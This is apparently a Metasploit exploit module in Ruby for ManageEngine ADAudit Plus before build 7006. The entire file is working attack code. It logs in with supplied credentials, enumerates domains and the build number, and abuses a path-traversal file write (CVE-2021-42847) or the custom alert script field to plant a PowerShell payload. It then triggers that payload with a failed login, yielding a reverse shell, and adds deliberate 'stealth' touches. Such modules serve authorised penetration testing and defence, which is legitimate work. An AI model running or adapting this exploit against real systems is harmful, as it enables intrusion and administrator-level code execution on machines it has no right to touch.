##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote

  Rank = ExcellentRanking
  prepend Msf::Exploit::Remote::AutoCheck
  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'ManageEngine ADAudit Plus Authenticated File Write RCE',
        'Description' => %q{
          This module exploits security issues in ManageEngine ADAudit Plus
          prior to 7006 that allow authenticated users to execute arbitrary
          code by creating a custom alert profile and leveraging the custom
          alert script component.

          The module first runs a few checks to test the provided
          credentials, retrieve the configured domain(s) and obtain the
          build number. If the credentials are valid and the target is
          vulnerable, the module creates an alert profile that will be
          triggered for any failed login attempt to the configured domain.

          For versions prior to build 7004, the payload is directly inserted
          in the custom alert script component of the alert profile.

          For versions 7004 and 7005, the module leverages an arbitrary file
          write vulnerability (CVE-2021-42847) to create a Powershell script
          in the alert_scripts directory that contains the payload. The name
          of this script is then provided as the value for the custom alert
          script component of the alert profile.

          This module requires valid credentials for an account with the
          privileges to create alert scripts. It has been successfully tested
          against ManageEngine ADAudit Plus builds 7003 and 7005 running on
          Windows Server 2012 R2.

          Successful exploitation will result in RCE as the user running
          ManageEngine ADAudit Plus, which will typically be the local
          administrator.
        },
        'License' => MSF_LICENSE,
        'Author' => [
          'Moon', # CVE-2021-42847 discovery
          'Erik Wynter' # @wyntererik - Additional research and Metasploit module
        ],
        'References' => [
          ['CVE', '2021-42847'],
          ['URL', 'https://pitstop.manageengine.com/portal/en/community/topic/fix-released-for-a-vulnerability-in-manageengine-adaudit-plus'],
          ['URL', 'https://www.manageengine.com/products/active-directory-audit/adaudit-plus-release-notes.html']
        ],
        'Privileged' => true,
        'DisclosureDate' => '2021-10-01',
        'Platform' => 'win',
        'Arch' => ARCH_CMD,
        'Targets' => [
          [
            'Windows Command',
            {
              'Type' => :win_cmd,
              'Arch' => ARCH_CMD,
              'DefaultOptions' => {
                'PAYLOAD' => 'cmd/windows/powershell_reverse_tcp'
              }
            }
          ]
        ],
        'DefaultTarget' => 0,
        'DefaultOptions' => {
          'RPORT' => 8081,
          'WfsDelay' => 5 # triggering the payload may take a bit, let's not be too hasty
        },
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'Reliability' => [FIRST_ATTEMPT_FAIL],
          'SideEffects' => [IOC_IN_LOGS, ARTIFACTS_ON_DISK]
        }
      )
    )

    register_options([
      OptString.new('TARGETURI', [true, 'The base path to ManageEngine ADAudit Plus', '/']),
      OptString.new('AUTH_DOMAIN', [true, 'ADAudit Plus authentication domain (default is ADAuditPlus Authentication)', 'ADAuditPlus Authentication']),
      OptString.new('USERNAME', [true, 'Username to authenticate with', 'admin']),
      OptString.new('PASSWORD', [true, 'Password to authenticate with', 'admin']),
    ])
  end

  def auth_domain
    datastore['AUTH_DOMAIN']
  end

  def username
    datastore['USERNAME']
  end

  def password
    datastore['PASSWORD']
  end

  def gpo_watcher_data_uri
    normalize_uri(target_uri.path, 'api', 'agent', 'tabs', 'agentGPOWatcherData')
  end

  def gpo_watcher_data_check
    res = send_request_cgi({
      'uri' => gpo_watcher_data_uri,
      'method' => 'POST'
    })

    return 1 unless res
    return 2 unless res.code == 200

    0
  end

  # this method will return an Array consisting of a return code and either a cookie, a failure message, or an empty string (if no cookie is needed)
  # return code 0 means authentication succeeded
  # return code 1 indicates failure corresponding to CheckCode::Unknown and Failure::Unknown
  # return code 2 indicates invalid credentials, this corresponds to CheckCode::Safe and Failure::NoAccess
  def authenticate(mode = 'standard')
    # Make sure domain_alias is populated in case the user opted not to run the check code.
    if @domain_alias.blank?
      @domain_alias = auth_domain
    end

    if mode == 'trigger_payload'
      cookie_jar.clear # let's start fresh
      print_status("Attempting to trigger the payload via an authentication attempt for domain #{@domain_alias} using incorrect credentials.")
      trigger_attempt_fail_message = " You can try to manually trigger the payload via a failed login attempt for the #{@domain_alias} domain."
    else
      trigger_attempt_fail_message = ''
    end

    # visit the default page again to get required cookies
    res_initial_cookies = send_request_cgi({
      'uri' => normalize_uri(target_uri.path),
      'method' => 'GET',
      'keep_cookies' => true
    })

    unless res_initial_cookies
      return [1, "Connection failed.#{trigger_attempt_fail_message}"]
    end

    unless res_initial_cookies.code == 200 && res_initial_cookies.headers.include?('Set-Cookie')
      return [1, "Failed to obtain the necessary cookies to proceed.#{trigger_attempt_fail_message}"]
    end

    # visit another page for more required cookies
    unless mode == 'silent'
      vprint_status('Attempting to obtain the required cookies for authentication')
    end
    res_extra_cookies = send_request_cgi({
      'uri' => normalize_uri(target_uri.path, 'adsf', 'js', 'common', 'JumpTo.js'),
      'method' => 'GET',
      'keep_cookies' => true
    })

    unless res_extra_cookies
      return [1, "Connection failed.#{trigger_attempt_fail_message}"]
    end

    unless res_extra_cookies.code == 200 && res_extra_cookies.headers.include?('Set-Cookie') && res_extra_cookies.get_cookies =~ /adapcsrf=[a-z0-9]{128}/
      return [1, "Failed to obtain the cookies required for authentication.#{trigger_attempt_fail_message}"]
    end

    if mode == 'trigger_payload' # We should provide incorrect credentials to trigger the custom alert profile
      post_vars = {
        'forChecking' => '',
        'j_username' => rand_text_alphanumeric(5..8),
        'j_password' => rand_text_alphanumeric(8..12),
        'domainName' => @domain_alias,
        'AUTHRULE_NAME' => 'Authenticator'
      }
    else
      post_vars = {
        'forChecking' => '',
        'j_username' => username,
        'j_password' => password,
        'domainName' => auth_domain,
        'AUTHRULE_NAME' => 'Authenticator'
      }
    end

    if mode == 'standard'
      print_status('Trying to authenticate...')
    end
    res_login = send_request_cgi({
      'uri' => normalize_uri(target_uri.path, 'j_security_check'),
      'method' => 'POST',
      'keep_cookies' => true,
      'vars_post' => post_vars
    })

    if mode == 'trigger_payload'
      # if we're only here to trigger the payload, we should only verify the response code and HTTP title
      if res_login
        if res_login.code == 200 && res_login.body =~ /<title>ADAudit Plus/
          print_status("Trigger attempt completed. Let's hope we get a shell...")
        else
          print_warning('Received unexpected reply after sending the trigger request. Exploitation may not work.')
        end
      else
        print_error('Connection failed while trying to trigger the payload, exploitation most likely failed.')
        print_error(trigger_attempt_fail_message)
      end

      # we don't need to return a cookie here so let's set it to an empty string
      return [0, '']
    end

    unless res_login
      return [1, 'Connection failed']
    end

    unless res_login.code == 303 && res_login.headers.include?('Set-Cookie')
      return [2, 'Failed to authenticate.']
    end

    # check if we are actually logged in by visiting the home page
    res_post_auth = send_request_cgi({
      'uri' => normalize_uri(target_uri.path),
      'method' => 'GET',
      'keep_cookies' => true
    })

    unless res_post_auth
      return [1, 'Connection failed']
    end

    unless res_post_auth.code == 200 && res_post_auth.body.include?('ManageEngine ADAudit Plus web client is initializing')
      return [2, 'The web app failed to load after authenticating']
    end

    # return the value of the adapcsrf cookie, which will be required for later actions
    adapcsrf_cookie = cookie_jar.cookies.select { |k| k.name == 'adapcsrf' }&.first
    if adapcsrf_cookie.blank? || adapcsrf_cookie.value.blank?
      return [2, 'Failed to obtain the required adapcsrf cookie']
    end

    # In order to get a cookie we can actually use, we now need to obtain the configured domains via the api
    if mode == 'silent'
      return obtain_configured_domains(adapcsrf_cookie.value, silent: true)
    end

    csrf_res, adapcsrf_cookie = obtain_configured_domains(adapcsrf_cookie.value)

    case csrf_res
    when 1
      return [1, 'Authentication succeeded, but the connection failed while attempting to obtain the adapcsrf cookie required for further requests']
    when 2
      return [2, 'Authentication succeeded, but it was not possible to obtain the adapcsrf cookie required for further requests']
    end

    print_good('Successfully authenticated')
    return [0, adapcsrf_cookie]
  end

  def check_build(adapcsrf_cookie)
    # for this to work we'll first have to obtain the configured domains

    vprint_status('Attempting to obtain the ADAudit Plus build number')

    res = send_request_cgi({
      'uri' => normalize_uri(target_uri.path, 'api', 'json', 'tabs', 'showLicenseDetails'),
      'method' => 'POST',
      'keep_cookies' => true,
      'vars_post' => {
        'adapcsrf' => adapcsrf_cookie
      }
    })

    unless res
      return CheckCode::Unknown('Connection failed')
    end

    unless res.code == 200 && res.body =~ /"buildNumber":".*?",/
      return CheckCode::Unknown('Received unexpected reply when attempting to obtain the build number.')
    end

    build = res.body.scan(/"buildNumber":"(.*?)",/)&.flatten&.first
    if build.blank?
      return CheckCode::Detected('No build number was obtained.')
    end

    begin
      build_version = Rex::Version.new(build)
    rescue StandardError
      return CheckCode::Unknown("Recieved an invalid build number: #{build}")
    end

    if build_version < Rex::Version.new('7004')
      @exploit_method = 'default'
      return CheckCode::Appears("The target is ADAudit Plus #{build_version}")
    end

    # For builds 7004 and 7005 exploitation will still be possible via CVE-2021-42847 if the vulnerable endpoint exists
    if build_version < Rex::Version.new('7006')
      endpoint_check = gpo_watcher_data_check
      case endpoint_check
      when 0
        @exploit_method = 'cve_2021_42847'
        return CheckCode::Appears("The target is ADAudit Plus #{build_version} and the endpoint for CVE-2021-42847 exists.")
      when 1
        return CheckCode::Unknown("The target is ADAudit Plus #{build_version} but the connection failed when checking for the CVE-2021-42847 endpoint")
      when 2
        return CheckCode::Safe("The target is ADAudit Plus #{build_version} but the endpoint for CVE-2021-42847 is not accessible.")
      end
    end

    return CheckCode::Safe("The target is ADAudit Plus #{build_version}")
  end

  def obtain_configured_domains(adapcsrf_cookie, silent: false)
    unless silent
      vprint_status('Attempting to obtain the list of configured domains...')
    end

    res = send_request_cgi({
      'uri' => normalize_uri(target_uri.path, 'api', 'json', 'configuredDomainsList'),
      'method' => 'POST',
      'keep_cookies' => true,
      'vars_post' => {
        'JSONString' => '{"checkGDPR":true}',
        'adapcsrf' => adapcsrf_cookie
      }
    })

    unless res
      return [1, 'Connection failed while attempting to obtain the list of configured domains...']
    end

    if res.code == 200 && res.body.include?('domainFullList')
      unless silent
        begin
          domain_info = JSON.parse(res.body)
          if domain_info.blank? || !domain_info.include?('domainFullList') || domain_info['domainFullList'].empty?
            print_warning('Failed to identify any configured domains. The module will continue but exploitation may fail.')
          else
            domain_full_list = domain_info['domainFullList']
            print_status("Found #{domain_full_list.length} configured domain(s):")

            if domain_full_list&.first&.include?('name')
              @domain = domain_full_list.first['name']
              vprint_status("Using domain #{@domain} for the name of the directory we will be creating")
            end

            domain_full_list.each do |domain|
              d_name = domain['name']
              value = domain['value']
              print_status("- #{d_name}: #{value}")
            end
          end
        rescue JSON::ParserError => e
          print_error('Failed to identify any configured domains - The server response did not contain valid JSON.')
          print_error("Error was: #{e.message}")
        end
      end
    else
      print_warning('Failed to obtain the list of configured domains. This is not critical, but is unexpected behavior, so the exploit may fail.')
    end

    # return the value of the adapcsrf cookie, which will be required for later actions
    adapcsrf_cookie = cookie_jar.cookies.select { |k| k.name == 'adapcsrf' }&.first
    if adapcsrf_cookie.blank? || adapcsrf_cookie.value.blank?
      return [2, 'Failed to obtain the required adapcsrf cookie']
    end

    [0, adapcsrf_cookie.value]
  end

  def delete_alert(adapcsrf_cookie)
    print_status("Attempting to delete alert profile #{@alert_name}")
    # let's try and get the the ID of the alert we want to delete
    res_get_alert = send_request_cgi({
      'uri' => normalize_uri(target_uri.path, 'api', 'json', 'leftTrees', 'getLeftTreeList'),
      'method' => 'POST',
      'keep_cookies' => true,
      'vars_post' => {
        'TAB_ID' => '5', # this cannot be randomized
        'adapcsrf' => adapcsrf_cookie
      }
    })

    unless res_get_alert
      print_warning("Connection failed when attempting to obtain the alert profile ID #{@alert_name}. Manual cleanup required.")
      return
    end

    unless res_get_alert.code == 200 && !res_get_alert.body.empty?
      print_warning("Received unexpected reply when attempting to obtain the alert profile ID #{@alert_name}. Manual cleanup required.")
      return
    end

    alert_id = res_get_alert.body.scan(/modelId":(\d+),"name":"#{@alert_name}/)&.flatten&.first
    if alert_id.nil?
      print_warning("Failed to obtain the alert profile ID #{@alert_name}. Manual cleanup required.")
      return
    end

    # delete the alert
    res_delete_alert = send_request_cgi({
      'uri' => normalize_uri(target_uri.path, 'api', 'json', 'config', 'alertprofiles', 'delete'),
      'method' => 'POST',
      'keep_cookies' => true,
      'vars_post' => {
        'data' => { 'ids' => [alert_id] }.to_json,
        'adapcsrf' => adapcsrf_cookie
      }
    })

    unless res_delete_alert
      print_warning("Connection failed when attempting to delete alert profile #{@alert_name}. Manual cleanup required.")
      return
    end

    unless res_delete_alert.code == 200 && res_delete_alert.body.include?('Successfully deleted the alert profile')
      print_warning("Received unexpected reply when attempting to delete alert profile #{@alert_name}. Manual cleanup required.")
      return
    end

    print_good("Successfully deleted alert profile #{@alert_name}")
  end

  def create_alert_profile
    if @exploit_method == 'cve_2021_42847'
      print_status('Attempting to authenticate again in order to retrieve the required cookies.')
      # we have to authenticate again in order to get the required cookie
      cookie_jar.clear
      auth_res_code, cookie_or_err_msg = authenticate('silent')
      case auth_res_code
      when 1
        fail_with(Failure::Unknown, cookie_or_err_msg)
      when 2
        fail_with(Failure::NoAccess, cookie_or_err_msg)
      end

      @adapcsrf_cookie = cookie_or_err_msg
    end

    print_status('Attempting to create an alert profile')
    # visit /api/json/jsMessage to see if we're dealing with 7003 or lower
    res_check_7004 = send_request_cgi({
      'uri' => normalize_uri(target_uri.path, 'api', 'json', 'jsMessage'),
      'method' => 'POST',
      'keep_cookies' => true,
      'vars_post' => { 'adapcsrf' => @adapcsrf_cookie }
    })

    unless res_check_7004
      fail_with(Failure::Unknown, 'Connection failed when trying to get the required info via /api/json/jsMessage')
    end

    unless res_check_7004.code == 200 && res_check_7004.body.include?('adap_common_script_info')
      fail_with(Failure::Unknown, 'Received unexpected response when trying to get the required info via /api/json/jsMessage')
    end

    alert_script_7004_msg = 'Your alert profile script path configuration is not compliant with the constraints listed below and needs to '\
    'be changed. These constraints have been introduced in the latest build of ADAudit Plus 7004, to enhance security'

    if res_check_7004.body.include?(alert_script_7004_msg)
      # we are dealing with 7004 or higher. so exploitation can only succeed if the exploit method is cve_2021_42847
      unless @exploit_method == 'cve_2021_42847'
        # let's check for the CVE-2021-42847 endpoint in case the user has disabled autocheck
        gpo_watcher_data_res = gpo_watcher_data_check
        unless gpo_watcher_data_res == 0
          fail_with(Failure::NotVulnerable, 'The target is build 7004 or up and not vulnerable to CVE-2021-42847. Exploitation is not possible.')
        end

        # here we have to authenticate again in order to get the required cookie
        cookie_jar.clear
        auth_res_code, cookie_or_err_msg = authenticate('silent')
        case auth_res_code
        when 1
          fail_with(Failure::Unknown, cookie_or_err_msg)
        when 2
          fail_with(Failure::NoAccess, cookie_or_err_msg)
        end

        @adapcsrf_cookie = cookie_or_err_msg
      end

      # we need to leverage CVE-2021-42847 to create a PowerShell script in /alert_scripts and then use the script name when creating the alert profile
      @ps1_script_name = create_alert_script
    end

    # save the alert profile
    @alert_name, alert_data = alert_profile_info
    res_save_alert = send_request_cgi({
      'uri' => normalize_uri(target_uri.path, 'api', 'json', 'config', 'alertprofiles', 'save'),
      'method' => 'POST',
      'keep_cookies' => true,
      'vars_post' => {
        'data' => alert_data,
        'adapcsrf' => @adapcsrf_cookie
      }
    })

    unless res_save_alert
      fail_with(Failure::Unknown, 'Connection failed when trying to create an alert profile via /api/json/config/alertprofiles/save')
    end

    unless res_save_alert.code == 200 && res_save_alert.body.include?('Successfully Saved the Alert Profile')
      print_error("The server sent the following response: #{res_save_alert.body&.strip}")
      @alert_name = nil # if we are here the alert profile was not created so let's skip cleanup by setting @alert_name to nil
      fail_with(Failure::Unknown, 'Failed to create an alert profile via /api/json/config/alertprofiles/save')
    end

    print_good("Successfully created alert profile #{@alert_name}")
  end

  def alert_profile_info
    script_location = @ps1_script_name || payload.encoded

    alert_name = rand_text_alphanumeric(8..12)
    alert_data = {
      'alertName' => alert_name,
      'alertDescription' => rand_text_alpha(20..30),
      'alertSeverity' => '1',
      'alertMsg' => '%FORMAT_MESSAGE%',
      'alertIsMailNotify' => false,
      'alertIsSMSNotify' => false,
      'monitorList' => [1],
      'selectedCategory' => 'All',
      'domainName' => @domain,
      'isSave' => true,
      'alertProfileId' => 'new',
      'thresholdBasedAlert' => false,
      'thresholdCount' => rand(5..15),
      'thresholdPeriod' => '=',
      'thresholdInterval' => rand(3..10),
      'thresholdGroupingColumns' => [],
      'throttleBasedAlert' => false,
      'throttleInterval' => rand(30..90),
      'throttleGroupingColumns' => [],
      'userMap' => {},
      'hourBasedAlert' => false,
      'contentType' => 'html',
      'alertMsgNeeded' => true,
      'alertProfileNameNeeded' => true,
      'mailAlertLink' => '',
      'eventDetails' => true,
      'emailMoreRecipients' => '',
      'smsMoreRecipients' => '',
      'scriptLocation' => script_location,
      'alertFilter' => false,
      'criteriaValue' => '-'
    }.to_json

    # we need to send along the alert name too since we'll need it to delete the alert after it's been created
    [alert_name, alert_data]
  end

  def create_alert_script
    ps1_script_name = "#{rand_text_alpha_lower(5..10)}.ps1"
    print_status("Attempting to write the payload to /alert_scripts/#{ps1_script_name}")

    if @domain.blank?
      @domain = "#{rand_text_alpha_lower(5..10)}.local"
      vprint_status("Using domain #{@domain} for the name of the directory we will be creating")
    end

    json_post_data = {
      'isGPOData' => true,
      'DOMAIN_NAME' => @domain,
      # match the standard format for GPO GUIDs for a dash of extra stealth
      'GPO_GUID' => "{#{Rex::Text.rand_text_alphanumeric(8)}-#{Rex::Text.rand_text_alphanumeric(4)}-#{Rex::Text.rand_text_alphanumeric(4)}-#{Rex::Text.rand_text_alphanumeric(4)}-#{Rex::Text.rand_text_alphanumeric(12)}}".downcase,
      'GPO_VERSION' => rand(1..9),
      # use the same VER_FILE_NAME format as ADAudit Plus for a dash of extra stealth
      'VER_FILE_NAME' => "#{rand(1..9)}_#{Rex::Text.rand_text_numeric(18)}".downcase + '.xml',
      'xmlReport' => '<?xml version="1.0" encoding="utf-16"?>',
      'Html_fileName' => "..\\..\\..\\..\\..\\alert_scripts\\#{ps1_script_name}", # the traversal path to alert_scripts should always be correct no matter where ADAudit Plus is installed
      'htmlReport' => payload.encoded
    }.to_json

    res = send_request_cgi({
      'method' => 'POST',
      'uri' => normalize_uri(target_uri.path, 'api', 'agent', 'tabs', 'agentGPOWatcherData'),
      'ctype' => 'application/json',
      'data' => json_post_data
    })

    unless res
      fail_with(Failure::Unknown, 'Connection failed')
    end

    unless res.code == 200 && res.body.include?('{"success":true}')
      fail_with(Failure::Unknown, 'Failed to upload the payload.')
    end

    print_good("Successfully wrote the payload to /alert_scripts/#{ps1_script_name} in the ManageEngine ADAudit Plus install directory")
    ps1_script_name
  end

  def check
    # visit the default page to check if the target is ADAudit Plus
    res = send_request_cgi({
      'uri' => normalize_uri(target_uri.path),
      'method' => 'GET'
    })

    unless res
      return CheckCode::Unknown('Connection failed')
    end

    unless res.code == 200 && res.body =~ /<title>ADAudit Plus/
      return CheckCode::Safe('Does not appear to be ADAudit Plus')
    end

    # in order to trigger the final payload in the exploit method, we will need to send an authentication request to ADAudit Plus with incorrect active directory credentials
    # if the user didn't provide an active directory domain, we can try to extract the FQDN for a configured domain from the server response
    domain_aliases = res.body.scan(/<select id="domainName" name="domainName".*?<option value="(.*?)">/m)&.flatten

    if domain_aliases.blank?
      return CheckCode::Safe("No configured active directory domains were found. The target may or may not be vulnerable but the module won't be able to trigger the payload.")
    end

    if auth_domain == 'ADAuditPlus Authentication'
      @domain_alias = domain_aliases.first
    else
      unless domain_aliases.include?(auth_domain)
        print_status('Identified the following configured authentication domain(s):')
        domain_aliases.each do |dom|
          print_line("- #{dom}")
        end
        return CheckCode::Detected("The provided AUTH_DOMAIN #{auth_domain} does not match the configured authentication domain(s).")
      end

      @domain_alias = auth_domain
    end

    print_status("Using configured authentication domain alias #{@domain_alias}.")

    # in order to obtain the build version, we need to authenticate
    auth_res_code, cookie_or_err_msg = authenticate
    case auth_res_code
    when 1
      return CheckCode::Unknown(cookie_or_err_msg)
    when 2
      return CheckCode::Safe(cookie_or_err_msg)
    end

    @adapcsrf_cookie = cookie_or_err_msg

    # check the build version
    check_build(cookie_or_err_msg)
  end

  def exploit
    if @exploit_method.nil? # this means the user has disabled autocheck so we should try the default exploit method
      @exploit_method = 'default'
    elsif @exploit_method == 'cve_2021_42847' && datastore['PAYLOAD'] =~ /meterpreter/
      print_warning('Exploitation is possible only via CVE-2021-42847. This attack vector may fail in combination with a meterpreter payload.')
      print_warning('If exploitation fails, consider setting the payload back to the default cmd/windows/powershell_reverse_tcp payload')
    end

    if @adapcsrf_cookie.blank?
      # let's clear the cookie jar and try to authenticate
      cookie_jar.clear
      auth_res_code, cookie_or_err_msg = authenticate

      case auth_res_code
      when 1
        fail_with(Failure::Unknown, cookie_or_err_msg)
      when 2
        fail_with(Failure::NoAccess, cookie_or_err_msg)
      end

      @adapcsrf_cookie = cookie_or_err_msg
    end

    # let's create the alert profile
    create_alert_profile

    # time to trigger the payload
    auth_res_code, cookie_or_err_msg = authenticate('trigger_payload')
    case auth_res_code
    when 1
      fail_with(Failure::Unknown, cookie_or_err_msg)
    when 2
      fail_with(Failure::NoAccess, cookie_or_err_msg)
    end

    @pwned = 0 # used to keep track of successful exploitation and the number of shells we get in cleanup and on_new_session
  end

  def cleanup
    return unless @alert_name # this should only run if we actually created an alert

    if @pwned == 0
      print_error('Failed to obtain a shell. You could try increasing the WfsDelay value')
    end
    cookie_jar.clear
    auth_res_code, cookie_or_err_msg = authenticate('silent')
    unless auth_res_code == 0
      print_warning('Failed to authenticate in order to perform cleanup. Manual cleanup required.')
      return
    end

    delete_alert(cookie_or_err_msg)
  end

  def on_new_session(cli)
    @pwned += 1
    # if we wrote a PowerShell script to /alert_scripts, remind the user to delete it
    # we may get two shells, so let's not repeat ourselves
    if @pwned == 1
      # I noticed the the meterpreter payloads wouldn't always load stdapi and/or priv automatically
      # but when loading them manually, they worked it fine
      if datastore['PAYLOAD'] =~ /meterpreter/ # I tried using cli.type == 'meterpreter' but that broke the module for some reason
        print_warning("If the client portion of stdapi or priv fails to load, you can do so manually via 'load stdapi' and/or load priv'")
      end

      if @ps1_script_name
        # meterpreter payloads seem incompatible with CVE-2021-42847, so it's very unlikely we'll ever be able to automatically remove the ps1 script
        print_warning("Make sure to manually cleanup the #{@ps1_script_name} file from /alert_scripts/ in the ManageEngine ADAudit Plus install directory")
      end
    end
    super
  end
end
